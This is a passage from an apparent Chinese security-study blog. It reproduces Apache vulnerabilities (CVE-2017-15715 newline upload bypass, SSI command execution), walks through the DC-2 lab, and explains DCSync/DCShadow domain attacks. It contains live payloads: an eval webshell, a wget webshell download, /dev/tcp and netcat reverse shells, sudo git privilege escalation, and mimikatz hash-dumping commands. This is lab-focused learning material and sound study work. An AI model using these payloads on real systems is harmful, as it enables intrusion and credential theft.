<p>可以看到很明显的index  of标志,说明此时存在目录遍历</p>
<p>我们可以在谷歌中通过 intitle ：index of来帮我们寻找目录遍历漏洞</p>
<h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成</p>
<p>Options -Indexes + FollowSymLinks + ExecCGI并保存（把+修改为-）</p>
<p><img src="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200201114345.png" alt></p>
<h4 id="Apache换行解析漏洞"><a href="#Apache换行解析漏洞" class="headerlink" title="Apache换行解析漏洞"></a>Apache换行解析漏洞</h4><p>转载：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715</a></p>
<p><strong>（我按该文章复现的以下两个漏洞，人懒就直接复制了。。。。）</strong></p>
<p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p>
<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
<p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p>
<p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https%3A//github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715">Vulhub</a>，环境文件有3个</p>
<ul>
<li>Dockerfile(apache环境)</li>
<li>docker-compose.yml（compose文件，在此环境中意义不大）</li>
<li>index.php（源文件缺少前台源码，已补全）</li>
</ul>
<p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>​        接下来通过实验的方式复现整个利用过程，首先先确认环境中的配置文件是否是&lt;FilesMatch .php$&gt;，路径为/etc/apache2/conf-available/docker-php.conf，该路径取决于apache2的目录，在搭建环境的时候不同apache版本路径可能不同，在Linux下的apache目录下执行grep -rn “FilesMatch” * 即可搜索到。<em>（在FilesMatch中的定义是将.php为后缀的文件解析为PHP，如果将其改为.(php|html)$的话，html中的php也会被解析。）</em><br>按照正常的漏洞利用步骤将其复现<br>0x01 抓包／改包<br>准备工作：将浏览器的代理打开、将burpsuit打开开启抓包。<br>访问漏洞页面<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/index.php">http://IP:8080/index.php</a>可以看到</p>
<p><img src="https://pic1.zhimg.com/80/v2-17a95fd0f1c3533df7c1ec56c642cfd8_720w.jpg" alt="img"></p>
<p>点击submit进行上传，burp可以抓到</p>
<p><img src="https://pic1.zhimg.com/80/v2-c3df365945893aa605e58927c377e110_720w.jpg" alt="img"></p>
<p>上图中最下面标红的地方是index.php代码中获取文件名的位置，但现在为空，需要填写上phpinfo.php1，后缀加1的目的是占位，下一步将1改为0x0a，点击上面红色箭头指向的Hex，将包修改为以下内容：</p>
<p><img src="https://pic2.zhimg.com/80/v2-844c604155e2bbdbfcdb51501261eb8d_720w.jpg" alt="img"></p>
<p>改完后将数据包给服务器，此时在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/phpinfo.php%0a">http://IP:8080/phpinfo.php%0a</a>便可以看到phpinfo的界面，说明利用成功。</p>
<p><strong>在Windows下的表现</strong><br>将漏洞代码复制到windows的环境中，进行访问、抓包（和文章中在Linux的方法一样），最终会出现以下问题：</p>
<p><img src="https://pic3.zhimg.com/80/v2-c5db07449b76d9786d7e0fc0a8daaca2_720w.png" alt="img"></p>
<p>根据上图可以发现，move_uploaded_file函数已经被执行了，说明我们绕过了黑名单的检测，只不过在windows创建文件的时候由于结尾是换行符，windows不允许，所以创建失败了。</p>
<p><strong>index.php源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">	<span class="keyword">echo</span> $name;</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . $name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Apache-SSI远程命令执行漏洞"><a href="#Apache-SSI远程命令执行漏洞" class="headerlink" title="Apache SSI远程命令执行漏洞"></a>Apache SSI远程命令执行漏洞</h4><p>转载：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce</a></p>
<p><strong>影响版本</strong>：Apache全版本（支持SSI与CGI）</p>
<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
<p><strong>环境说明</strong>：PHP7.1 、 Apache2.4.25</p>
<p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https%3A//github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce">Vulhub</a>，环境文件有2个</p>
<ul>
<li>docker-compose.yml</li>
<li>upload.php</li>
</ul>
<p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><strong>漏洞原理</strong><br>SSI（server-side includes）:是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在Apache官网对<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI的定义</a>，说白了就是可以在HTML中加入特定的指令，也可以引入其他的页面。开启SSI需要单独配置Apache，可以参考<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI配置</a>。<br>SSI可以完成查看时间、文件修改时间、CGI程序执行结果、执行系统命令、连接数据库等操作，功能非常强大。<br>我们要利用的就是SSI执行系统命令的功能，正常的一个包含SSI指令的文件，可以如下内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--<span class="comment">#exec cmd="whoami" --&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>文件名保存为test.shtml，这个后缀取决于Apache的配置，默认是此后缀。<br>当后台对扩展名校验不严格时，可以上传此类型文件，达到执行命令，获取webshell的目的。执行效果：</p>
<p><img src="https://pic1.zhimg.com/80/v2-ebadded85bd12ddb13481a3cf4d86d80_720w.jpg" alt="img"></p>
<p>上传webshell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;wget http:&#x2F;&#x2F;xxx&#x2F;shell.txt | rename shell.txt shell.php&quot; --&gt;</span><br><span class="line">echo &#39;&lt;?php @eval($_POST[margin]);?&gt;&#39; &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>反弹shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.118&#x2F;8888 0&lt;&amp;1 2&gt;&amp;1&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;nc x.x.x.x 8888 -e &#x2F;bin&#x2F;bash&quot;--&gt;</span><br></pre></td></tr></table></figure>

<h5 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p>
<p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/1.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/1.png" alt="img"></a></p>
<p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p>
<p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/2.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/2.png" alt="img"></a></p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://zhuanlan.zhihu.com/p/125115734" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/125115734</a></p>
]]></content>
      <categories>
        <category>中间件漏洞学习</category>
      </categories>
      <tags>
        <tag>apache中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2靶机学习</title>
    <url>/2020/04/03/dc-2-ba-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="DC-2靶机测试"><a href="#DC-2靶机测试" class="headerlink" title="DC-2靶机测试"></a>DC-2靶机测试</h2><p>[TOC]</p>
<h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205133827.png" alt></p>
<p>我们使用netdiscover进行主机发现。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r <span class="number">192.168</span><span class="number">.153</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205102253.png" alt></p>
<p>确定了靶机IP为192.168.153.136</p>
<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用nmap 进行信息收集</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.136</span> -T4</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205111215.png" alt></p>
<p>我们发现靶机上开放着80端口，并且部署了apache服务器，7744开启了SSH服务。提示是一个wordpress站点</p>
<p>我们需要首先在host文件下添加<a href="http://dc-2/域名，然后使用浏览器去访问该域名。" target="_blank" rel="noopener">http://dc-2/域名，然后使用浏览器去访问该域名。</a></p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205111308.png" alt></p>
<p>我们使用Wappalyzer进行指纹识别。确定了是一个WordPress的站点。</p>
<h4 id="第三步、使用Wpscan扫描"><a href="#第三步、使用Wpscan扫描" class="headerlink" title="第三步、使用Wpscan扫描"></a>第三步、使用Wpscan扫描</h4><p>​       该扫描器可以实现获取<code>Wordpress</code>站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p>
<p>我们使用命令扫描网站内的用户名</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url dc-2 -e u</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205132051.png" alt></p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205132034.png" alt></p>
<p>获取到用户名后，我们思考能否爆破密码。</p>
<p>我们首先使用crel收集网页的信息</p>
<p>​    Cewl：CeWL是一款以爬虫模式在指定URL上收集单词的工具，可以将它收集到的单词纳入密码字典，以提高密码破解工具的成功率。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">cewl dc<span class="number">-2</span> -w dict.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205111938.png" alt></p>
<p>得到密码字典后我们继续回到wpscan进行密码爆破、</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url dc-2 -P dict.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205132515.png" alt></p>
<p>我们得到了两个登录的账号和密码。</p>
<h4 id="第四步、登录后台"><a href="#第四步、登录后台" class="headerlink" title="第四步、登录后台"></a>第四步、登录后台</h4><p>我们通过wpscan发现了默认的后台登录页面。（wp-login.php)</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205132755.png" alt></p>
<p>我们使用jerry用户进行登录。在其账号中发现了flag2.txt的信息。</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205132930.png" alt></p>
<p>我们翻译一下：</p>
<p>如果你不能利用WordPress并抄近路，还有别的办法。           </p>
<p>   希望你能找到另一个切入点。</p>
<h4 id="第五步、登录ssh"><a href="#第五步、登录ssh" class="headerlink" title="第五步、登录ssh"></a>第五步、登录ssh</h4><pre><code>我们尝试使用上面两个账户来登陆ssh。首先尝试tom的账户。</code></pre><p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200217113658.png" alt></p>
<p>可以登陆，ls一下可以看到flag3。</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200217113757.png" alt></p>
<p>​    但是登陆使用的shell是rBash，功能受到严重限制以至于cat命令都无法使用，所以需要想办法绕过限制。我们先尝试把shell切换为/bin/sh，成功了。继续尝试使用cat来查看flag3中的内容，提示不能找到命令，这时候原因应该是没有将cat命令的目录添加到$PATH中，于是添加之。然后使用cat查看flag3.txt中的内容。<br>rBash和sh shell命令</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205115512.png" alt></p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205115956.png" alt></p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205120014.png" alt></p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205120104.png" alt></p>
<h4 id="第六步、Git提权获得最终flag"><a href="#第六步、Git提权获得最终flag" class="headerlink" title="第六步、Git提权获得最终flag"></a>第六步、Git提权获得最终flag</h4><p>我们先切换到jerry用户，在jerry的家目录下找到flag4.txt</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205120330.png" alt></p>
<p>flag4 提示我们可以使用git，我们可以通过git来提权</p>
<p>sudo -l 我们可以看到无需root权限，jerry 可以使用 git ！</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200217123533.png" alt></p>
<p>我们可以利用suid 进行提权</p>
<p>SUID可以让调用者以文件拥有者的身份运行该文件</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sudo git -p <span class="comment">--help</span></span><br></pre></td></tr></table></figure>

<p>输入!/bin/bash 获得root权限</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200217123719.png" alt></p>
<p>我们在root目录下找到最后一个flag。</p>
<p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200217123829.png" alt></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>DC-2靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>DCSync与DCshadow攻击学习</title>
    <url>/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="DCSync与DCshadow攻击学习"><a href="#DCSync与DCshadow攻击学习" class="headerlink" title="DCSync与DCshadow攻击学习"></a>DCSync与DCshadow攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>DCSync与DCshadow是域渗透中经常会用到的技术。</p>
<h3 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h3><p>​    2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。</p>
<p>​    DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。</p>
<p>​    DCSync 的最大特点，在于不用登录域服务器，即可远程通过<strong>域数据同步复制</strong>的方式获得想要的用户口令信息。</p>
<p>​    需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据</p>
<h4 id="DCSync攻击原理"><a href="#DCSync攻击原理" class="headerlink" title="DCSync攻击原理"></a>DCSync攻击原理</h4><p>DCSync 的原理非常清晰，利用<strong>域控制器之间的数据同步复制</strong>。</p>
<ul>
<li>发现网络中的目标域控制器;</li>
<li>通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol</li>
</ul>
<p>Samba wiki 关于 GetNCChanges 的描述包括:</p>
<p>​    当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。</p>
<p>如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p>
<h5 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h5><p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</a></p>
<h4 id="DCSync攻击前提"><a href="#DCSync攻击前提" class="headerlink" title="DCSync攻击前提"></a>DCSync攻击前提</h4><p>一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：</p>
<ul>
<li>Administrators组内的用户</li>
<li>Domain Admins组内的用户</li>
<li>Enterprise Admins组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
<p>即：默认情况下域管理员组具有该权限。</p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507093022.png-water_print" alt="img"></p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507093039.png-water_print" alt="img"></p>
<h4 id="DCSync攻击利用"><a href="#DCSync攻击利用" class="headerlink" title="DCSync攻击利用"></a>DCSync攻击利用</h4><h5 id="1-使用mimikatz"><a href="#1-使用mimikatz" class="headerlink" title="1.使用mimikatz"></a>1.使用mimikatz</h5><p>导出域内所有用户的hash：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:test.com /all /csv"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507093111.png-water_print" alt="img"></p>
<p>导出域内administrator帐户的hash：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:test.com /user:administrator /csv"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<h5 id="2-powershell实现"><a href="#2-powershell实现" class="headerlink" title="2.powershell实现"></a>2.powershell实现</h5><p><a href="https://gist.github.com/monoxgas/9d238accd969550136db" target="_blank" rel="noopener">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
<p>通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p>
<p>导出域内所有用户的hash：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">Invoke-DCSync -DumpForest <span class="string">| ft -wrap -autosize</span></span><br></pre></td></tr></table></figure>

<p>导出域内administrator帐户的hash：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Invoke-DCSync -DumpForest -Users @(<span class="string">"administrator"</span>) | ft -<span class="keyword">wrap</span> -<span class="keyword">a</span></span><br></pre></td></tr></table></figure>

<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/domain:rd.adsecurity.org /</span><span class="string">user:</span>Administrator</span><br></pre></td></tr></table></figure>



<h4 id="DCSync防御"><a href="#DCSync防御" class="headerlink" title="DCSync防御"></a>DCSync防御</h4><p>DCSync 攻击的原理是模拟域控制器发起服务器之间的数据同步复制。</p>
<p>最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步</p>
<p>获取域内所有IP的脚本:</p>
<p>powershell</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PowerShell:<span class="built_in">Get-ADDomainController</span> <span class="literal">-filter</span> * | select IPv4Address</span><br><span class="line">或</span><br><span class="line">[<span class="type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain().DomainControllers | select IPAddress</span><br></pre></td></tr></table></figure>

<p>在网络设备上检测来自白名单以外的域控制器数据同步复制</p>
<h3 id="DCShadow-攻击"><a href="#DCShadow-攻击" class="headerlink" title="DCShadow 攻击"></a>DCShadow 攻击</h3><p>2018年1月24日，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 在 BlueHat IL 会议期间公布了针对域活动目录的一种新型攻击技术 <code>DCShadow</code></p>
<p>在<strong>具备域管理员权限条件</strong>下，攻击者可以<strong>创建伪造的域控制器</strong>，将预先设定的对象或对象属性复制到正在运行域服务器中。</p>
<p>DCSync 从域服务器复制出东西，DCShadow 是将数据复制至域服务器。</p>
<p>Luc Delsalle 对这种技术进行了验证和详细的描述，并就红蓝对抗中蓝队对抗此种攻击技术的缺陷和补救方法。</p>
<p>从 DCShadow 目前展示的功能来看，主要只能用于红蓝对抗的隐蔽后门。但是 DCShadow 第一次澄清和实现了伪造一个 DC 的最小需求合集，这个贡献非常大。以 前很多攻击方法都卡在不能伪造域服务器，例如 MS15-011 和 MS15-014 等，有了 <code>DCShadow</code> 的基础，相信将来会有很多新的攻击方法。</p>
<h4 id="DCShadow-攻击流程"><a href="#DCShadow-攻击流程" class="headerlink" title="DCShadow 攻击流程"></a>DCShadow 攻击流程</h4><p>根据 Luc Delsalle 的描述，DCShadow 的攻击过程包括 3 个主要个步骤:</p>
<p>1、在目标域的 AD 活动目录注册一个伪造的 DC 中;</p>
<p>2、使伪造的 DC 被其他的 DC 认可，能够参与域复制 ;</p>
<p>3、强制触发域复制，将指定的新对象或修改后的对象属性同步复制到其他 DC 中;</p>
<h4 id="注册伪造的DC"><a href="#注册伪造的DC" class="headerlink" title="注册伪造的DC"></a>注册伪造的DC</h4><p>一台机器要想注册成为域中的一台 DC 服务器，需要在域的活动目录中注册一个 <code>NTDS-DSA(nTDSDSA)</code>类对象。注册的位置为 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code></p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100302.png-water_print" alt="img"></p>
<p>adsec.com 域有 3 台域服务器，分别是 LABDC01、RESDC01 及 WIN2016-DC01，标红的正是我们实验环境的域服务器。我们测试的机器为 Win7X86cn04，测试成功的则会生成一个新的NTDS-DSA(nTDSDSA)类对象</p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100638.png-water_print" alt="img"></p>
<p>查看 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code>的安全描述符，可知必须有<code>域管理员权限</code>才具备<code>写</code>权限</p>
<p>所以发动 DCShadow 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改</p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100807.png-water_print" alt="img"></p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100835.png-water_print" alt="img"></p>
<p>DC Shadow 源码：</p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100956.png-water_print" alt="img"></p>
<h4 id="注册的DC被其他DC认可，能够参与域复制"><a href="#注册的DC被其他DC认可，能够参与域复制" class="headerlink" title="注册的DC被其他DC认可，能够参与域复制"></a>注册的DC被其他DC认可，能够参与域复制</h4><p>一个刚注册的 DC 要想被域中其他DC认可，能够参与域复制，需要满足 3 个条件:</p>
<ul>
<li>这台伪造 DC 具备认证凭证，能认证到域，即有域内账号，可以使用机器账号，实验环境中为 <code>WIN7X86CN04$</code>;</li>
<li>伪造 DC 能认证其他 DC 来访问的账号，如果我们给 <code>WIN7X86CN04$</code> 添加 <code>SPN</code>，则可以实现这一点。关键是需要添加哪些SPN，DCShadow 的一个大贡献是找到 了 SPN 的最小合集，只需要 2 个即可:<code>DRS</code>服务(GUID 为 E3514235–4B06–11D1-AB04–00C04FC2DCD2) 和 <code>GS</code>(Global Catalog)服务</li>
</ul>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507101146.png-water_print" alt="img"></p>
<ul>
<li>运行DRS服务，最少需要实现 IDL_DRSBind、IDL_DRSUnbind、IDL_DRSGetNCChanges、IDL_DRSUpdateRefs 这 4 个 RPC 接口，以便其他 DC 能够通过 RPC 获取需要复制的数据。Mimikatz 工具的最新版已经集成了这 4 个接口</li>
</ul>
<h4 id="强制立即发起域复制"><a href="#强制立即发起域复制" class="headerlink" title="强制立即发起域复制"></a>强制立即发起域复制</h4><p>​    通常负责域复制和同步的进程是 KCC 进程，默认时间是 15 分钟校验一次，如果需要复制则发起;也可以使用 Windows 域服务器自带的系统工具 repadmin，该工具会调用 DRSReplicaAdd 函数接口强制立即发起域复制，DCShadow 正是通过调用 DRSReplicaAdd 函数强制立即发起域复制</p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507101534.png-water_print" alt="img"></p>
<h4 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h4><p>查看 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code> 的安全描述符，可知必须有域管理员权限才具备写权限</p>
<p>所以发动 <code>DCShadow</code> 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改</p>
<p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507101621.png-water_print" alt="img"></p>
]]></content>
      <categories>
        <category>内网与域渗透学习</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全--RMI基础学习</title>
    <url>/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/</url>
    <content><![CDATA[<h2 id="java安全学习–RMI学习"><a href="#java安全学习–RMI学习" class="headerlink" title="java安全学习–RMI学习"></a>java安全学习–RMI学习</h2><h3 id="RMI定义"><a href="#RMI定义" class="headerlink" title="RMI定义"></a>RMI定义</h3><ul>
<li>Java远程调用，<strong>实现远程调用的应用程序编程接口</strong>。</li>
<li>RMI对象是通过<strong>序列化方式</strong>进行编码传输的。</li>
<li>Java程序远程调用另一台服务器的java对象。</li>
<li>RMI依赖的通信协议 JRMP。</li>
</ul>
